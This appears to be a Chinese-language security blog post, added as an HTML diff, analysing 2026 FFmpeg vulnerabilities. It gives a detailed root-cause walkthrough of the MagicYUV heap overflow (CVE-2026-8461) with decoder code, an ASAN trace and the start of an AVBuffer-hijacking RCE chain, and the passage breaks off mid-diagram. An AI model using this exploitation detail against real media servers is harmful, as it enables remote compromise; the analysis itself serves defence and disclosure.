@@ -1,0 +1,1641 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FFmpeg高危漏洞分析：恶意视频文件破坏内存 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>FFmpeg高危漏洞分析：恶意视频文件破坏内存</h1>
+<time>2026-07-30</time>
+<ul>
+<li>安全</li>
+<li>漏洞分析
+Slug: ffmpeg高危漏洞分析恶意视频文件破坏内存</li>
+</ul>
+<hr />
+<h2>目录</h2>
+<ul>
+<li><a href="#1-引言多媒体处理框架的攻击面">1. 引言：多媒体处理框架的攻击面</a></li>
+<li><a href="#2-ffmpeg架构与攻击面分析">2. FFmpeg架构与攻击面分析</a></li>
+<li><a href="#3-cve-2026-8461pixelsmashmagicyuv解码器堆溢出">3. CVE-2026-8461（PixelSmash）：MagicYUV解码器堆溢出</a></li>
+<li><a href="#31-漏洞概况">3.1 漏洞概况</a></li>
+<li><a href="#32-magicyuv编解码器背景">3.2 MagicYUV编解码器背景</a></li>
+<li><a href="#33-根因分析色度平面高度计算不匹配">3.3 根因分析：色度平面高度计算不匹配</a></li>
+<li><a href="#34-从堆溢出到rce劫持avbuffer">3.4 从堆溢出到RCE：劫持AVBuffer</a></li>
+<li><a href="#35-恶意视频文件构造方法">3.5 恶意视频文件构造方法</a></li>
+<li><a href="#4-cve-2026-66036hqdn3d滤镜堆溢出">4. CVE-2026-66036：hqdn3d滤镜堆溢出</a></li>
+<li><a href="#41-漏洞概况">4.1 漏洞概况</a></li>
+<li><a href="#42-根因分析帧尺寸变化导致缓冲区不足">4.2 根因分析：帧尺寸变化导致缓冲区不足</a></li>
+<li><a href="#5-cve-2026-66039mace6音频解码器有符号整数溢出">5. CVE-2026-66039：MACE6音频解码器有符号整数溢出</a></li>
+<li><a href="#51-漏洞概况">5.1 漏洞概况</a></li>
+<li><a href="#52-根因分析采样计数计算溢出">5.2 根因分析：采样计数计算溢出</a></li>
+<li><a href="#6-ffmpeg主要攻击面汇总">6. FFmpeg主要攻击面汇总</a></li>
+<li><a href="#7-fuzzing发现ffmpeg漏洞的方法">7. Fuzzing发现FFmpeg漏洞的方法</a></li>
+<li><a href="#8-防御方案">8. 防御方案</a></li>
+<li><a href="#9-总结">9. 总结</a></li>
+<li><a href="#免责声明">免责声明</a></li>
+</ul>
+<hr />
+<h2>1. 引言：多媒体处理框架的攻击面</h2>
+<p>FFmpeg是全球部署最广泛的多媒体处理框架。从桌面视频播放器（mpv、VLC）、自托管媒体服务器（Jellyfin、Plex、Emby）、云转码管道（AWS MediaConvert、Cloudflare Stream）到Linux桌面环境的缩略图生成器（GNOME、KDE、XFCE），FFmpeg的<code>libavcodec</code>库被数百个下游项目链接或捆绑。</p>
+<p>2026年，FFmpeg连续披露了多批高危漏洞。6月，JFrog安全研究团队披露了CVE-2026-8461（PixelSmash），一个MagicYUV解码器中的堆越界写漏洞，他们将其从简单崩溃一路升级到针对Jellyfin媒体服务器的可靠远程代码执行。7月24日，VulnCheck又披露了6个高危漏洞（CVE-2026-66036至CVE-2026-66041），涵盖堆缓冲区溢出、整数溢出、资源耗尽和信息泄露。这些漏洞的共同特征是：<strong>攻击者只需要让目标处理一个精心构造的媒体文件，就能触发内存破坏</strong>。</p>
+<p>本文将深度分析三个代表性漏洞：CVE-2026-8461（MagicYUV解码器堆溢出，CVSS 8.8）、CVE-2026-66036（hqdn3d滤镜堆溢出，CVSS 7.7）和CVE-2026-66039（MACE6音频解码器有符号整数溢出，CVSS 8.7），并系统性地梳理FFmpeg的攻击面和Fuzzing方法。</p>
+<hr />
+<h2>2. FFmpeg架构与攻击面分析</h2>
+<h3>2.1 FFmpeg核心架构</h3>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────────────┐
+│                        FFmpeg 核心架构与攻击面                           │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  ┌─────────────────────────────────────────────────────────────────┐   │
+│  │                     输入层 (Input Layer)                         │   │
+│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │   │
+│  │  │ protocol │  │  demuxer │  │  format  │  │  stream  │        │   │
+│  │  │  (IO)    │  │ (解复用) │  │ (格式)   │  │ (流管理) │        │   │
+│  │  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘        │   │
+│  │       │              │              │              │             │   │
+│  │  攻击面: file://, http://, rtp://, tcp://, pipe://              │   │
+│  │  攻击面: AVI, MKV, MOV, FLV, TS, MP4, WAV, OGG...               │   │
+│  └───────┼──────────────┼──────────────┼──────────────┼───────────┘   │
+│          │              │              │              │                 │
+│  ┌───────┼──────────────┼──────────────┼──────────────┼───────────┐   │
+│  │       v              v              v              v           │   │
+│  │              ┌──────────────────┐                               │   │
+│  │              │   AVPacket 队列   │                               │   │
+│  │              │  (压缩数据包)     │                               │   │
+│  │              └────────┬─────────┘                               │   │
+│  └───────────────────────┼─────────────────────────────────────────┘   │
+│                          │                                               │
+│  ┌───────────────────────┼─────────────────────────────────────────┐   │
+│  │                       v                                         │   │
+│  │              ┌──────────────────┐                               │   │
+│  │              │  codec (编解码)   │                               │   │
+│  │              │  ┌────────────┐  │                               │   │
+│  │              │  │  decoder   │  │  &lt;-- CVE-2026-8461            │   │
+│  │              │  │ (解码器)   │  │      MagicYUV堆溢出            │   │
+│  │              │  └────────────┘  │                               │   │
+│  │              │  ┌────────────┐  │                               │   │
+│  │              │  │  encoder   │  │  &lt;-- CVE-2026-66040           │   │
+│  │              │  │ (编码器)   │  │      PNG/APNG eXIf堆溢出       │   │
+│  │              │  └────────────┘  │                               │   │
+│  │              └────────┬─────────┘                               │   │
+│  └───────────────────────┼─────────────────────────────────────────┘   │
+│                          │                                               │
+│  ┌───────────────────────┼─────────────────────────────────────────┐   │
+│  │                       v                                         │   │
+│  │              ┌──────────────────┐                               │   │
+│  │              │   AVFrame (帧)    │                               │   │
+│  │              └────────┬─────────┘                               │   │
+│  └───────────────────────┼─────────────────────────────────────────┘   │
+│                          │                                               │
+│  ┌───────────────────────┼─────────────────────────────────────────┐   │
+│  │                       v                                         │   │
+│  │              ┌──────────────────┐                               │   │
+│  │              │  filter (滤镜)    │  &lt;-- CVE-2026-66036           │   │
+│  │              │  ┌────────────┐  │      hqdn3d堆溢出              │   │
+│  │              │  │ vf_hqdn3d  │  │  &lt;-- CVE-2026-66041           │   │
+│  │              │  │ vf_quirc   │  │      quirc OOB写               │   │
+│  │              │  └────────────┘  │                               │   │
+│  │              └────────┬─────────┘                               │   │
+│  └───────────────────────┼─────────────────────────────────────────┘   │
+│                          │                                               │
+│  ┌───────────────────────┼─────────────────────────────────────────┐   │
+│  │                       v                                         │   │
+│  │              ┌──────────────────┐                               │   │
+│  │              │  muxer (复用器)   │                               │   │
+│  │              │  + output IO     │                               │   │
+│  │              └──────────────────┘                               │   │
+│  └─────────────────────────────────────────────────────────────────┘   │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>2.2 攻击面层级分析</h3>
+<p>FFmpeg的攻击面从外到内分为四个主要层级，每个层级都处理攻击者可控的输入数据：</p>
+<table>
+<thead>
+<tr>
+<th>攻击面层级</th>
+<th>组件</th>
+<th>输入来源</th>
+<th>典型漏洞类型</th>
+<th>代表CVE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Demuxer层</td>
+<td>AVI/MKV/MOV/FLV解复用器</td>
+<td>文件容器格式</td>
+<td>整数溢出、OOB读</td>
+<td>CVE-2026-30999 (mov.c CENC)</td>
+</tr>
+<tr>
+<td>Codec层</td>
+<td>视频/音频解码器和编码器</td>
+<td>压缩码流数据</td>
+<td>堆溢出、UAF、整数溢出</td>
+<td>CVE-2026-8461 (MagicYUV)</td>
+</tr>
+<tr>
+<td>Filter层</td>
+<td>视频滤镜 (denoise, scale等)</td>
+<td>解码后的帧数据</td>
+<td>堆溢出、OOB写</td>
+<td>CVE-2026-66036 (hqdn3d)</td>
+</tr>
+<tr>
+<td>Protocol层</td>
+<td>HTTP/RTP/TCP/文件IO</td>
+<td>网络协议数据</td>
+<td>SSRF、资源耗尽</td>
+<td>CVE-2026-66037 (IAMF)</td>
+</tr>
+</tbody>
+</table>
+<h3>2.3 为什么FFmpeg是高价值攻击目标</h3>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────────┐
+│               FFmpeg 作为攻击目标的价值分析                           │
+├─────────────────────────────────────────────────────────────────────┤
+│                                                                     │
+│  1. 普遍性: FFmpeg被数百个下游项目链接                               │
+│     ├── 桌面播放器: mpv, VLC, Kodi                                  │
+│     ├── 媒体服务器: Jellyfin, Plex, Emby, Nextcloud                 │
+│     ├── 云服务: AWS MediaConvert, Cloudflare Stream                 │
+│     ├── 桌面环境: GNOME, KDE, XFCE (缩略图生成)                     │
+│     ├── 聊天平台: Slack, Discord, Telegram (预览生成)               │
+│     └── IoT/NAS: Synology, QNAP, 智能电视                           │
+│                                                                     │
+│  2. 自动触发: 许多应用自动处理用户上传的媒体文件                     │
+│     ├── 媒体服务器: 自动扫描库 → 自动解码 → 自动生成缩略图           │
+│     ├── 文件管理器: 浏览到含视频的文件夹 → 自动生成缩略图            │
+│     └── 云转码: 用户上传 → 自动转码 → 自动分发                      │
+│                                                                     │
+│  3. 攻击门槛低: 只需交付一个媒体文件                                │
+│     ├── 无需认证: 上传文件即可触发                                  │
+│     ├── 无需交互: 服务器端自动处理                                  │
+│     └── 跨平台: FFmpeg在所有主流OS上运行                            │
+│                                                                     │
+│  4. 供应链放大: 一个漏洞影响所有下游项目                            │
+│     ├── 下游项目继承了FFmpeg的漏洞                                  │
+│     ├── 大多数项目无独立检测机制                                    │
+│     └── 修复依赖FFmpeg上游发布 + 下游重新编译                       │
+│                                                                     │
+└─────────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<hr />
+<h2>3. CVE-2026-8461（PixelSmash）：MagicYUV解码器堆溢出</h2>
+<h3>3.1 漏洞概况</h3>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE编号</td>
+<td>CVE-2026-8461</td>
+</tr>
+<tr>
+<td>漏洞名称</td>
+<td>PixelSmash</td>
+</tr>
+<tr>
+<td>CVSS 3.1评分</td>
+<td>8.8 (High)</td>
+</tr>
+<tr>
+<td>CWE分类</td>
+<td>CWE-787 (Out-of-bounds Write)</td>
+</tr>
+<tr>
+<td>影响版本</td>
+<td>FFmpeg &lt; 9.0 (所有默认构建)</td>
+</tr>
+<tr>
+<td>漏洞位置</td>
+<td><code>libavcodec/magicyuv.c</code></td>
+</tr>
+<tr>
+<td>披露者</td>
+<td>JFrog安全研究团队</td>
+</tr>
+<tr>
+<td>披露日期</td>
+<td>2026年6月22日</td>
+</tr>
+<tr>
+<td>实际RCE验证</td>
+<td>Jellyfin (自动库扫描)、Nextcloud (视频预览)</td>
+</tr>
+<tr>
+<td>攻击向量</td>
+<td>交付50KB恶意AVI/MKV/MOV文件</td>
+</tr>
+</tbody>
+</table>
+<p>PixelSmash是2026年FFmpeg最严重的漏洞之一。JFrog团队不仅发现了这个堆越界写漏洞，还将其从简单崩溃升级到了针对Jellyfin媒体服务器的可靠远程代码执行——仅通过上传一个50KB的AVI文件。</p>
+<h3>3.2 MagicYUV编解码器背景</h3>
+<p>MagicYUV是一种为高性能视频编辑工作流设计的无损视频编解码器。虽然不如H.264或VP9知名，但它的解码器被编译进每一个默认的FFmpeg构建中，并注册用于AVI、MKV和MOV容器。任何能打开视频文件的应用都能触发MagicYUV解码器。</p>
+<p>检测系统是否包含漏洞解码器：</p>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检查FFmpeg是否包含MagicYUV解码器</span>
+ffmpeg<span class="w"> </span>-decoders<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>magicyuv
+<span class="c1"># 如果输出包含 VFS..D magicyuv，则系统存在漏洞</span>
+</code></pre></div>
+
+<h3>3.3 根因分析：色度平面高度计算不匹配</h3>
+<p>漏洞的核心是帧分配器和解码器在计算色度平面高度时存在不一致——一个使用对齐后的值，另一个使用天花板舍入的值。</p>
+<p><strong>背景知识：YUV色彩空间与子采样</strong></p>
+<p>在视频压缩中，图像通常以YUV色彩空间存储，而非RGB：
+- Y（亮度平面）：图像的亮度/灰度信息
+- U &amp; V（色度平面）：颜色信息</p>
+<p>在YUV420P格式中，色度平面的垂直分辨率为亮度平面的一半（4:2:0子采样），以利用人眼对亮度比对色度更敏感的特性。</p>
+<p><strong>漏洞触发过程</strong></p>
+<div class="highlight"><pre><span></span><code><span class="c1">// libavcodec/magicyuv.c - 漏洞代码分析</span>
+
+<span class="c1">// 步骤1: 帧分配器计算色度平面缓冲区高度</span>
+<span class="c1">// libavutil/get_buffer.c - update_frame_pool()</span>
+<span class="c1">// 帧高度先对齐到32，然后减半用于色度</span>
+<span class="kt">int</span><span class="w"> </span><span class="n">aligned_height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FFALIGN</span><span class="p">(</span><span class="n">coded_height</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span><span class="w">  </span><span class="c1">// 例如: 32</span>
+<span class="kt">int</span><span class="w"> </span><span class="n">chroma_height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AV_CEIL_RSHIFT</span><span class="p">(</span><span class="n">aligned_height</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w">  </span><span class="c1">// 32/2 = 16</span>
+<span class="c1">// 分配的色度缓冲区: 16行</span>
+
+<span class="c1">// 步骤2: 解码器从攻击者控制的码流中读取slice_height</span>
+<span class="c1">// magicyuv.c:550</span>
+<span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytestream2_get_le32u</span><span class="p">(</span><span class="o">&amp;</span><span class="n">gb</span><span class="p">);</span><span class="w">  </span><span class="c1">// 攻击者控制! 例如: 31</span>
+
+<span class="c1">// 步骤3: 解码器计算slice数量和每个slice的色度行数</span>
+<span class="c1">// magicyuv.c:559</span>
+<span class="n">s</span><span class="o">-&gt;</span><span class="n">nb_slices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">coded_height</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="p">;</span>
+<span class="c1">// = (32 + 31 - 1) / 31 = 2 (两个slice)</span>
+
+<span class="c1">// magicyuv.c:275 - 每个slice的色度行数 (天花板舍入)</span>
+<span class="kt">int</span><span class="w"> </span><span class="n">sheight</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AV_CEIL_RSHIFT</span><span class="p">(</span><span class="n">s</span><span class="o">-&gt;</span><span class="n">slice_height</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="c1">// = AV_CEIL_RSHIFT(31, 1) = 16  (ceil(31/2) = 16)</span>
+
+<span class="c1">// 步骤4: 第二个(最后一个)slice的目标指针计算</span>
+<span class="c1">// magicyuv.c:287</span>
+<span class="c1">// j = 1 (第二个slice的索引)</span>
+<span class="c1">// height = sheight = 16 (色度行数)</span>
+<span class="n">dst</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">stride</span><span class="p">;</span>
+<span class="c1">// = p-&gt;data[1] + 1 * 16 * stride</span>
+<span class="c1">// = 色度缓冲区的第16行!</span>
+<span class="c1">// 但缓冲区只有16行(索引0-15)，第16行是越界的!</span>
+
+<span class="c1">// 步骤5: 堆越界写</span>
+<span class="c1">// magicyuv.c:291-294 (raw模式)</span>
+<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">height</span><span class="p">;</span><span class="w"> </span><span class="n">k</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">bytestream_get_buffer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">slice</span><span class="p">,</span><span class="w"> </span><span class="n">dst</span><span class="p">,</span><span class="w"> </span><span class="n">width</span><span class="p">);</span><span class="w">  </span><span class="c1">// OOB WRITE!</span>
+<span class="w">    </span><span class="n">dst</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">stride</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// width = 640 (coded_width=1280, 色度减半)</span>
+<span class="c1">// 向堆中写入640字节攻击者控制的数据</span>
+</code></pre></div>
+
+<p><strong>关键不一致：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">          </span><span class="nt">分配器</span><span class="w"> </span><span class="nt">vs</span><span class="w"> </span><span class="nt">解码器的色度高度计算对比</span><span class="w">                        </span><span class="err">│</span>
+<span class="err">├──────────────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">分配器</span><span class="w"> </span><span class="o">(</span><span class="nt">get_buffer</span><span class="p">.</span><span class="nc">c</span><span class="o">):</span><span class="w">                                          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">aligned_height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">FFALIGN</span><span class="o">(</span><span class="nt">32</span><span class="o">,</span><span class="w"> </span><span class="nt">32</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">32</span><span class="w">                        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">chroma_rows</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">AV_CEIL_RSHIFT</span><span class="o">(</span><span class="nt">32</span><span class="o">,</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">16</span><span class="w">                     </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">分配</span><span class="o">:</span><span class="w"> </span><span class="nt">16行</span><span class="w"> </span><span class="nt">x</span><span class="w"> </span><span class="nt">stride</span><span class="w"> </span><span class="nt">字节</span><span class="w">                                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">有效行索引</span><span class="o">:</span><span class="w"> </span><span class="nt">0</span><span class="o">,</span><span class="w"> </span><span class="nt">1</span><span class="o">,</span><span class="w"> </span><span class="nt">2</span><span class="o">,</span><span class="w"> </span><span class="o">...,</span><span class="w"> </span><span class="nt">15</span><span class="w">                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">解码器</span><span class="w"> </span><span class="o">(</span><span class="nt">magicyuv</span><span class="p">.</span><span class="nc">c</span><span class="o">):</span><span class="w">                                            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">slice_height</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="o">(</span><span class="nt">来自码流</span><span class="err">，</span><span class="nt">攻击者控制</span><span class="o">)</span><span class="w">                      </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">nb_slices</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">(</span><span class="nt">32</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="nt">-</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nt">31</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">2</span><span class="w">                           </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">sheight</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">AV_CEIL_RSHIFT</span><span class="o">(</span><span class="nt">31</span><span class="o">,</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">ceil</span><span class="o">(</span><span class="nt">31</span><span class="o">/</span><span class="nt">2</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nt">16</span><span class="w">            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">Slice</span><span class="w"> </span><span class="nt">0</span><span class="o">:</span><span class="w"> </span><span class="nt">写入行</span><span class="w"> </span><span class="nt">0</span><span class="o">.</span><span class="p">.</span><span class="nc">15</span><span class="w"> </span><span class="o">(</span><span class="nt">16行</span><span class="o">)</span><span class="w"> </span><span class="err">←</span><span class="w"> </span><span class="nt">在缓冲区内</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">Slice</span><span class="w"> </span><span class="nt">1</span><span class="o">:</span><span class="w"> </span><span class="nt">写入行</span><span class="w"> </span><span class="nt">16</span><span class="o">.</span><span class="p">.</span><span class="nc">31</span><span class="w"> </span><span class="o">(</span><span class="nt">16行</span><span class="o">)</span><span class="w"> </span><span class="err">←</span><span class="w"> </span><span class="nt">行16超出缓冲区</span><span class="o">!</span><span class="w">              </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">问题本质</span><span class="o">:</span><span class="w">                                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">分配器用对齐后的高度</span><span class="o">(</span><span class="nt">32</span><span class="o">)</span><span class="nt">计算色度行数</span><span class="o">:</span><span class="w"> </span><span class="nt">16行</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">解码器用原始slice高度</span><span class="o">(</span><span class="nt">31</span><span class="o">)</span><span class="nt">计算色度行数</span><span class="o">:</span><span class="w"> </span><span class="nt">ceil</span><span class="o">(</span><span class="nt">31</span><span class="o">/</span><span class="nt">2</span><span class="o">)=</span><span class="nt">16行</span><span class="o">/</span><span class="nt">slice</span><span class="w"> </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">两个slice共写</span><span class="w"> </span><span class="nt">16</span><span class="o">+</span><span class="nt">16</span><span class="o">=</span><span class="nt">32行</span><span class="err">，</span><span class="nt">但缓冲区只有16行</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">第二个slice的写入完全在缓冲区之外</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="nt">堆溢出</span><span class="w">                    </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">现有保护</span><span class="o">:</span><span class="w">                                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">magicyuv</span><span class="p">.</span><span class="nc">c</span><span class="p">:</span><span class="nd">566</span><span class="w"> </span><span class="nt">只检查了隔行扫描</span><span class="o">(</span><span class="nt">interlaced</span><span class="o">)</span><span class="nt">模式的对齐</span><span class="o">:</span><span class="w">        </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">if</span><span class="w"> </span><span class="o">(</span><span class="nt">s-</span><span class="o">&gt;</span><span class="nt">interlaced</span><span class="o">)</span><span class="w"> </span><span class="p">{</span><span class="w">                                         </span><span class="err">│</span>
+<span class="err">│</span><span class="w">        </span><span class="err">if</span><span class="w"> </span><span class="err">((s-&gt;slice_height</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="err">s-&gt;vshift</span><span class="cp">[</span><span class="mi">1</span><span class="cp">]</span><span class="err">)</span><span class="w"> </span><span class="err">&lt;</span><span class="w"> </span><span class="err">2)</span><span class="w">               </span><span class="err">│</span>
+<span class="err">│</span><span class="w">            </span><span class="err">return</span><span class="w"> </span><span class="err">AVERROR_INVALIDDATA</span><span class="p">;</span><span class="w">                          </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="p">}</span><span class="w">                                                            </span><span class="err">│</span>
+<span class="err">│</span><span class="w">    </span><span class="nt">非隔行扫描路径完全没有对齐检查</span><span class="o">!</span><span class="w"> </span><span class="err">←</span><span class="w"> </span><span class="nt">漏洞根因</span><span class="w">                   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">└──────────────────────────────────────────────────────────────────┘</span>
+</code></pre></div>
+
+<p><strong>ASAN报告确认溢出位置：</strong></p>
+<div class="highlight"><pre><span></span><code><span class="o">==</span><span class="n">PID</span><span class="o">==</span><span class="nl">ERROR:</span><span class="w"> </span><span class="nl">AddressSanitizer:</span><span class="w"> </span><span class="n">heap</span><span class="o">-</span><span class="n">buffer</span><span class="o">-</span><span class="n">overflow</span>
+<span class="n">WRITE</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="mh">512</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0</span><span class="n">x52500000214f</span><span class="w"> </span><span class="n">thread</span><span class="w"> </span><span class="n">T0</span>
+<span class="w">    </span><span class="p">#</span><span class="mh">2</span><span class="w"> </span><span class="n">bytestream_get_buffer</span><span class="w"> </span><span class="n">libavcodec</span><span class="o">/</span><span class="n">bytestream</span><span class="p">.</span><span class="nl">h:</span><span class="mh">367</span>
+<span class="w">    </span><span class="p">#</span><span class="mh">3</span><span class="w"> </span><span class="n">magy_decode_slice</span><span class="w"> </span><span class="n">libavcodec</span><span class="o">/</span><span class="n">magicyuv</span><span class="p">.</span><span class="nl">c:</span><span class="mh">292</span>
+<span class="w">    </span><span class="p">#</span><span class="mh">5</span><span class="w"> </span><span class="n">magy_decode_frame</span><span class="w"> </span><span class="n">libavcodec</span><span class="o">/</span><span class="n">magicyuv</span><span class="p">.</span><span class="nl">c:</span><span class="mh">630</span>
+
+<span class="mh">0</span><span class="n">x52500000214f</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">located</span><span class="w"> </span><span class="mh">0</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="mh">8271</span><span class="o">-</span><span class="kt">byte</span><span class="w"> </span><span class="n">region</span>
+</code></pre></div>
+
+<h3>3.4 从堆溢出到RCE：劫持AVBuffer</h3>
+<p>堆溢出本身只是DoS，JFrog团队的关键贡献是将其升级为RCE。利用的核心是FFmpeg堆布局中的一个关键结构——<code>AVBuffer</code>。</p>
+<div class="highlight"><pre><span></span><code><span class="err">┌──────────────────────────────────────────────────────────────────┐</span>
+<span class="err">│</span><span class="w">              </span><span class="nt">CVE-2026-8461</span><span class="o">:</span><span class="w"> </span><span class="nt">从堆溢出到RCE的利用链</span><span class="w">                 </span><span class="err">│</span>
+<span class="err">├──────────────────────────────────────────────────────────────────┤</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="nt">堆内存布局</span><span class="w"> </span><span class="o">(</span><span class="nt">OOB写入区域</span><span class="o">):</span><span class="w">                                       </span><span class="err">│</span>
+<span class="err">│</span><span class="w">                                                                  </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌──────────────────────────────────────────────────────────┐</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="nt">色度平面缓冲区</span><span class="w"> </span><span class="o">(</span><span class="nt">16行</span><span class="o">)</span><span class="w">                                    </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">│</span><span class="w">  </span><span class="cp">[</span><span class="nx">row</span><span class="w"> </span><span class="mi">0</span><span class="cp">][</span><span class="nx">row</span><span class="w"> </span><span class="mi">1</span><span class="cp">]</span><span class="o">...</span><span class="cp">[</span><span class="nx">row</span><span class="w"> </span><span class="mi">15</span><span class="cp">]</span><span class="w">                               </span><span class="err">│</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">└──────────────────────────────────────────────────────────┘</span><span class="w">   </span><span class="err">│</span>
+<span class="err">│</span><span class="w">  </span><span class="err">┌──────────────────────────────────────────────────────────┐</span><span class="w">   </span><span class="err">│</span>
